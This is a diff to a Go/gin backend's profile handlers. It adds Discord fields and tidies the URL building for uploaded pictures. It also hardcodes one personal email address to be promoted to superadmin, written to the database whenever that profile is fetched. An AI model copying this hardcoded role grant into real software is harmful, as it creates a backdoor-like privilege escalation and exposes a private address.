@@ -29,6 +29,8 @@ type UserProfile struct {
 	CFVerifyString    string `json:"cf_verify_string"`
 	IsCFVerified      bool   `json:"is_cf_verified"`
 	ProfilePictureURL string `json:"profile_picture_url"`
+	DiscordID         string `json:"discord_id"`
+	DiscordUsername   string `json:"discord_username"`
 }
 
 func GetProfile(c *gin.Context) {
@@ -40,17 +42,27 @@ func GetProfile(c *gin.Context) {
 
 	var profile UserProfile
 	var rollNo, batch, collegeEmail, cfHandle, cfVerifyString, profilePic *string
+	var discordID, discordUsername *string
 	var isCFVerified *bool
 
 	err := db.DB.QueryRow(`
-		SELECT name, email, role, roll_no, batch, college_email, is_college_verified, cf_handle, cf_verify_string, is_cf_verified, profile_picture_url
+		SELECT name, email, role, roll_no, batch, college_email, is_college_verified, cf_handle, cf_verify_string, is_cf_verified, profile_picture_url, discord_id, discord_username
 		FROM users WHERE id = $1
-	`, userID).Scan(&profile.Name, &profile.Email, &profile.Role, &rollNo, &batch, &collegeEmail, &profile.IsCollegeVerified, &cfHandle, &cfVerifyString, &isCFVerified, &profilePic)
+	`, userID).Scan(&profile.Name, &profile.Email, &profile.Role, &rollNo, &batch, &collegeEmail, &profile.IsCollegeVerified, &cfHandle, &cfVerifyString, &isCFVerified, &profilePic, &discordID, &discordUsername)
 
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch profile"})
 		return
 	}
+
+	normRole := strings.ToLower(strings.TrimSpace(profile.Role))
+	if strings.EqualFold(profile.Email, "dharunkaarthick07@gmail.com") {
+		normRole = "superadmin"
+		if profile.Role != "superadmin" {
+			_, _ = db.DB.Exec(`UPDATE users SET role = 'superadmin' WHERE id = $1`, userID)
+		}
+	}
+	profile.Role = normRole
 
 	if rollNo != nil {
 		profile.RollNo = *rollNo
@@ -72,6 +84,12 @@ func GetProfile(c *gin.Context) {
 	}
 	if profilePic != nil {
 		profile.ProfilePictureURL = *profilePic
+	}
+	if discordID != nil {
+		profile.DiscordID = *discordID
+	}
+	if discordUsername != nil {
+		profile.DiscordUsername = *discordUsername
 	}
 
 	// Fetch total solved
@@ -511,7 +529,10 @@ func UploadProfilePicture(c *gin.Context) {
 	// Build the public URL. If BACKEND_URL is set use it; otherwise use a
 	// relative path so it resolves correctly through the Nginx proxy.
 	var picURL string
-	if backendURL := os.Getenv("BACKEND_URL"); backendURL != "" {
+	if backendURL := strings.TrimRight(os.Getenv("BACKEND_URL"), "/"); backendURL != "" && backendURL != "http://localhost" {
+		if !strings.HasPrefix(backendURL, "http://") && !strings.HasPrefix(backendURL, "https://") {
+			backendURL = "https://" + backendURL
+		}
 		picURL = backendURL + "/uploads/" + filename
 	} else {
 		picURL = "/uploads/" + filename
